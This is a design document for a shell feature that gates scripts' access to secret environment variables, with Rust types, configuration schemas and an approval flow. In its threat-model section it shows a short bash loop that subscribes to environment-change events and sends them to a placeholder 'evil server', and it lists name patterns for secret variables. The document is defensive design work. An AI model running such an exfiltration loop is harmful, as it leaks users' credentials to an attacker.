# Secure Environment Variables Design

**Date:** 2025-12-22  
**Status:** Draft  
**Author:** Brainstorming session with user

## Overview

Secure environment variables provide gated access control for sensitive data stored in environment variables. This addresses the security gap where any process can read secrets like `AWS_SECRET_KEY` or `GITHUB_TOKEN` without restriction.

### Problem Statement

1. **Accidental exposure** - `env` or `echo $SECRET` dumps secrets to terminal/logs
2. **Malicious scripts** - Untrusted scripts can read any environment variable
3. **Tuple space attack vector** - Colony's reactive tuple space emits `env_change` events that could be subscribed to by rogue scripts to exfiltrate secrets

### Solution Summary

- Mark certain env vars as "secure" via auto-detection patterns or explicit configuration
- First-use approval with memory: prompt user on first access, remember decision based on script content hash
- Transitive process inheritance: approved script's children inherit approval
- Segregated tuple channels: secure vars emit to protected channels, never exposing values

---

## Core Concepts & Data Model

### Secure Variable Registry

A secure variable has metadata beyond just its value:

```rust
struct SecureVariable {
    name: String,
    value: String,  // The actual secret
    source: SecureVarSource,
    created_at: DateTime<Utc>,
}

enum SecureVarSource {
    AutoDetected { pattern: String },  // Matched *_SECRET, etc.
    Explicit,                          // User ran `secure export`
    Config { file: PathBuf },          // From .colonyrc or secure-vars.toml
}
```

### Approval Record

When a script is approved to access a secret:

```rust
struct SecureApproval {
    script_path: PathBuf,
    script_hash: String,  // SHA256 of script contents
    variable_name: String,
    scope: ApprovalScope,
    granted_at: DateTime<Utc>,
    granted_by: String,  // "interactive" or config file path
}

enum ApprovalScope {
    Global,              // ~/.config/colony/secure-approvals.db
    Project(PathBuf),    // .colony/secure-approvals.db
}
```

### Pattern Configuration

Auto-detection patterns and overrides:

```toml
# ~/.config/colony/secure-vars.toml
[patterns]
secure = ["*_SECRET", "*_KEY", "*_TOKEN", "*_PASSWORD", "*_CREDENTIAL"]
not_secure = ["PUBLIC_KEY", "SSH_AUTH_SOCK"]  # Overrides

[variables]
# Explicit declarations
secure = ["MY_CUSTOM_SECRET", "COMPANY_API_KEY"]
```

---

## Access Control Flow

### When a process requests a secure variable

```
1. Script runs: `curl -H "Auth: $AWS_SECRET_KEY" ...`
                           |
                           v
2. Expansion phase detects AWS_SECRET_KEY is secure
                           |
                           v
3. Check approval database:
   +------------------------------------------+
   |  script_path: /home/user/deploy.sh       |
   |  script_hash: sha256:a1b2c3...           |
   |  variable: AWS_SECRET_KEY                |
   +------------------------------------------+
                           |
           +---------------+---------------+
           |                               |
     Found & hash matches            Not found OR hash changed
           |                               |
           v                               v
     Return value                   Emit OSC 2337 Widget
     (access granted)               (approval prompt)
                                           |
                           +---------------+---------------+
                           |               |               |
                        Allow once     Remember          Deny
                           |               |               |
                           v               v               v
                      Return value   Save approval    Return empty
                      (one-time)     + return value   + log attempt
```

### Process Lineage Tracking

When approval is granted with "Remember", the approval covers:
- The script itself (`deploy.sh`)
- Any child processes it spawns (transitive inheritance)

The lineage is tracked via process tree:
```
colony (PID 1000)
  +-- deploy.sh (PID 1001) <-- approved for AWS_SECRET_KEY
       +-- curl (PID 1002) <-- inherits approval from parent
       +-- aws (PID 1003)  <-- inherits approval from parent
```

Child processes inherit their parent's approvals for the duration of that process tree. If `deploy.sh` exits and runs again, it uses the remembered approval (hash check).

---

## Tuple Space Integration

### The Attack Vector (What We're Preventing)

Currently, any script can subscribe to the tuple space:

```bash
# Malicious script could do this:
while tuple=$(colony tuple read "env_change" "*" "*"); do
    send_to_evil_server "$tuple"  # Exfiltrates secrets!
done
```

### Solution: Segregated Tuple Channels

| Channel | Protection | Contents |
|---------|------------|----------|
| `env_change` | Public | `("env_change", "PATH", "/old", "/new")` - any process can subscribe |
| `secure_env_change` | Protected | `("secure_env_change", "AWS_KEY", "[SET]", timestamp)` - value never included, requires approval to subscribe |
| `secure_env_access` | Protected | `("secure_env_access", "AWS_KEY", "script.sh", "granted", timestamp)` - audit trail for security tooling |

### What Gets Emitted When

| Action | Public Channel | Secure Channel | Audit Channel |
|--------|---------------|----------------|---------------|
| `export PATH=/new` | `("env_change", "PATH", old, new)` | -- | -- |
| `secure export TOKEN=abc` | -- | `("secure_env_change", "TOKEN", "[SET]")` | -- |
| Script reads `$TOKEN` (approved) | -- | -- | `("secure_env_access", "TOKEN", "script.sh", "granted")` |
| Script reads `$TOKEN` (denied) | -- | -- | `("secure_env_access", "TOKEN", "script.sh", "denied")` |

### Subscription Authorization

Attempting to subscribe to protected channels triggers the same approval flow:
```
"audit-tool wants to subscribe to secure_env_* tuples. Allow?"
```

---

## User Interface & Builtins

### New Builtins

```bash
# Mark a variable as secure and set it
secure export AWS_SECRET_KEY="abc123"

# Mark existing variable as secure (without changing value)
secure mark EXISTING_VAR

# List secure variables (values redacted)
secure list
# Output:
#   AWS_SECRET_KEY    [auto: *_KEY]       set
#   GITHUB_TOKEN      [auto: *_TOKEN]     set
#   MY_SECRET         [explicit]          set
#   DB_PASSWORD       [config: .colonyrc] unset

# Show approvals for a variable
secure approvals AWS_SECRET_KEY
# Output:
#   /home/user/deploy.sh  sha256:a1b2c3...  granted 2025-12-20
#   /home/user/backup.sh  sha256:d4e5f6...  granted 2025-12-19

# Revoke an approval
secure revoke AWS_SECRET_KEY /home/user/deploy.sh

# Revoke all approvals for a variable
secure revoke AWS_SECRET_KEY --all

# Unmark a variable as secure (if you need to)
secure unmark PUBLIC_KEY
```

### OSC 2337 Widget Protocol

When approval is needed, shell emits:

```
ESC ] 2337 ; SecureAccess={
  "script": "/home/user/deploy.sh",
  "hash": "sha256:a1b2c3d4e5f6...",
  "hash_status": "first_seen",
  "variable": "AWS_SECRET_KEY",
  "source": "auto:*_KEY",
  "actions": ["allow_once", "remember", "deny", "view_script"]
} BEL
```

Terminal renders the rich widget:

```
+-- Secure Variable Access Request -------------------+
|                                                     |
| Script:  /home/user/project/deploy.sh               |
| Hash:    sha256:a1b2c3... (first seen)              |
| Wants:   AWS_SECRET_KEY                             |
| Reason:  Auto-detected (*_KEY pattern)              |
|                                                     |
| [A]llow once  [R]emember  [D]eny  [V]iew script     |
+-----------------------------------------------------+
```

Terminal responds:

```
ESC ] 2337 ; SecureAccessResponse={
  "decision": "remember",
  "script": "/home/user/deploy.sh",
  "variable": "AWS_SECRET_KEY"
} BEL
```

---

## Storage & Configuration

### File Locations

```
~/.config/colony/
  secure-vars.toml          # Pattern config & explicit declarations
  secure-approvals.db       # Global approval database (SQLite)
  secure-audit.log          # Optional audit trail

<project>/.colony/
  secure-vars.toml          # Project-specific overrides
  secure-approvals.db       # Project-scoped approvals
```

### secure-vars.toml Schema

```toml
# ~/.config/colony/secure-vars.toml (global)

[patterns]
# Auto-detect these as secure (glob patterns)
secure = [
    "*_SECRET",
    "*_SECRET_*",
    "*_KEY",
    "*_TOKEN",
    "*_PASSWORD",
    "*_CREDENTIAL",
    "*_API_KEY",
    "AWS_*_ACCESS_KEY*",
]

# Exclude from auto-detection (even if matches above)
not_secure = [
    "PUBLIC_KEY",
    "SSH_AUTH_SOCK",
    "GPG_AGENT_INFO",
]

[variables]
# Explicitly mark as secure (regardless of name)
secure = [
    "MY_COMPANY_SECRET",
    "DEPLOY_CREDENTIALS",
]

[audit]
# Optional: log all access attempts
enabled = true
file = "~/.config/colony/secure-audit.log"
```

```toml
# <project>/.colony/secure-vars.toml (project override)

[patterns]
# Additional patterns for this project
secure = ["STRIPE_*", "DATABASE_*"]

# Override global: this isn't sensitive in this project
not_secure = ["DATABASE_HOST"]

[variables]
secure = ["PROJECT_DEPLOY_KEY"]

[approvals]
# Pre-approve scripts (alternative to interactive)
[approvals."scripts/deploy.sh"]
variables = ["AWS_SECRET_KEY", "STRIPE_SECRET_KEY"]
# No hash = trust any version (use with caution)

[approvals."scripts/ci-build.sh"]
variables = ["NPM_TOKEN"]
hash = "sha256:abc123..."  # Only this exact version
```

### SQLite Schema (secure-approvals.db)

```sql
CREATE TABLE approvals (
    id INTEGER PRIMARY KEY,
    script_path TEXT NOT NULL,
    script_hash TEXT NOT NULL,
    variable_name TEXT NOT NULL,
    granted_at TEXT NOT NULL,
    granted_by TEXT NOT NULL,
    UNIQUE(script_path, script_hash, variable_name)
);

CREATE INDEX idx_script ON approvals(script_path);
CREATE INDEX idx_variable ON approvals(variable_name);
```

---

## Implementation Architecture

### New Crate: `colony-secure`

```
crates/colony-secure/
  src/
    lib.rs           # Public API
    registry.rs      # SecureVariable registry & pattern matching
    approvals.rs     # Approval database (SQLite)
    config.rs        # TOML config loading & merging
    lineage.rs       # Process tree tracking
    protocol.rs      # OSC 2337 SecureAccess messages
  Cargo.toml
```

### Integration Points

| Crate | Integration |
|-------|-------------|
| `colony-expand/context.rs` | `get_var_or_env()` calls `SecureRegistry::check_access()` before returning secure variable values |
| `colony-exec/builtins.rs` | New `secure` builtin dispatches to colony-secure |
| `colony-exec/command.rs` | `spawn_process()` registers child in lineage tracker |
| `colony-tuple/lib.rs` | `TupleSpace::subscribe()` checks channel permissions; `out()` routes to public vs secure channel |
| `colony-protocol/lib.rs` | New `SecureAccess` / `SecureAccessResponse` message types |
| `colony-shell/main.rs` | Initialize `SecureRegistry` on startup; handle `SecureAccessResponse` from terminal |

### Key Type Signatures

```rust
// colony-secure/src/lib.rs

pub struct SecureRegistry {
    config: SecureConfig,
    approvals: ApprovalDatabase,
    lineage: ProcessLineage,
    pending_requests: HashMap<RequestId, PendingAccess>,
}

impl SecureRegistry {
    /// Check if variable access is allowed for current process
    pub fn check_access(
        &mut self,
        variable: &str,
        requesting_script: &Path,
    ) -> AccessResult;

    /// Record a new child process under parent's lineage
    pub fn register_child(&mut self, parent_pid: u32, child_pid: u32);

    /// Handle response from terminal widget
    pub fn handle_response(&mut self, response: SecureAccessResponse);
}

pub enum AccessResult {
    Allowed(String),           // Value returned
    Denied,                    // Access refused
    Pending(RequestId),        // Awaiting user decision
    NotSecure(String),         // Variable isn't secure, normal access
}
```

### Expansion Integration (the critical path)

```rust
// colony-expand/src/context.rs (modified)

impl ExpansionContext {
    pub fn get_var_or_env(&self, name: &str) -> Option<String> {
        // ... existing special vars ($?, $#, etc.) ...

        // NEW: Check if variable is secure
        if let Some(registry) = &self.secure_registry {
            if registry.is_secure(name) {
                return match registry.check_access(name, &self.current_script) {
                    AccessResult::Allowed(value) => Some(value),
                    AccessResult::Denied => None,
                    AccessResult::Pending(id) => {
                        // Block until terminal responds
                        self.await_secure_access(id)
                    }
                    AccessResult::NotSecure(value) => Some(value),
                };
            }
        }

        // ... existing variable/environment lookup ...
    }
}
```

---

## Feature ID

This feature should be tracked as **F060: Secure Environment Variables** in `features.json`.

### Dependencies
- F007 (Core Builtins) - for `secure` builtin
- F009 (OSC 2337 Protocol) - for approval widget
- F010/F011 (Tuple Space) - for segregated channels
- F020 (.colonyrc Configuration) - for config layering pattern

### Priority
- **Priority 2** - Security feature, important for production use

---

## Open Questions

1. **Fallback without terminal** - What happens when running in a dumb terminal without OSC 2337 support? Options:
   - Deny all access to secure vars (safe but breaks scripts)
   - Fall back to stdin prompt (functional but ugly)
   - Read approvals from config only (no interactive approval)

2. **CI/CD environments** - Scripts in CI need secrets but can't prompt. Options:
   - Pre-approve via config with hash
   - Environment variable `COLONY_SECURE_NONINTERACTIVE=allow` (dangerous)
   - Separate "CI mode" with different trust model

3. **Performance** - Hash computation on every script invocation could be slow for large scripts. Options:
   - Cache hashes with mtime check
   - Only hash on first access per session
   - Background hash computation

---

## Future Enhancements

1. **Secret rotation detection** - Warn if a secure var value changes unexpectedly
2. **Expiring approvals** - Approvals could have TTL (re-prompt after 30 days)
3. **Team shared approvals** - Sync approvals across team via encrypted config
4. **Integration with secret managers** - Pull secure vars from 1Password, Vault, etc.
